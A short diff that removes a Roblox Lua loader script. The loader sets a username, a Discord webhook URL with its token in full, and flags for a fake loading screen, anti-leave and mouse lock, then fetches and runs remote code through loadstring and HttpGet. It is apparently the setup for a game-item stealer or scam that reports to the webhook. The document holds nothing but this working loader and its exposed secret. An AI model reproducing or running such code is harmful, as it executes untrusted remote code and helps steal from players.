@@ -1,9 +1,0 @@
-UserName = "imrealboy89"
-Webhook = "https://discord.com/api/webhooks/1129988657021976747/oiksUJaV19lZM5Xz3QKzKybW_Tn2WIpvhpnnrFzAmWHmOabiRlDftPNkq241g5phbkYS"
-UserName2 = "imrealboy89"
-
-_G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriScripts/main/MoriScriptZ", true))()
